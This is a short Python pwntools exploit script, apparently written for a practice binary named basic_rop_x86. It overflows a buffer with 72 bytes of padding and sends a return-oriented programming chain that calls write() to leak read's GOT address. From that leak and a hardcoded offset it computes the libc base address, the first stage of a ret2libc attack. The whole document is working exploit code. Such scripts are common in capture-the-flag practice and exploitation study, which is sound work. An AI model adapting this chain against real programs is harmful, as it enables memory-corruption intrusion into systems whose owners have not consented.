#!/usr/bin/python3

import pwn

p = pwn.process("/tmp/basic_rop_x86")
elf = pwn.ELF("/tmp/basic_rop_x86")
libc = elf.libc
rop = pwn.ROP(elf)

rop.write(1,elf.got["read"],4)

print("\n====================ROP Payload====================")
pwn.log.info(rop.dump())

padding = b"A"*72
payload = padding
payload += rop.chain()

pwn.log.info("Sending payload. . .")
p.sendline(payload)

p.recv(64)
read_addr = pwn.u32(p.recv(4))
print("\n====================Read function Address====================")
tmp = hex(read_addr)
pwn.log.info("Address: " + tmp)

read_offset = 0xd4350
libc_base = read_addr - read_offset
print("\n====================LIBC Base Address====================")
pwn.log.info("Address: " + hex(libc_base))
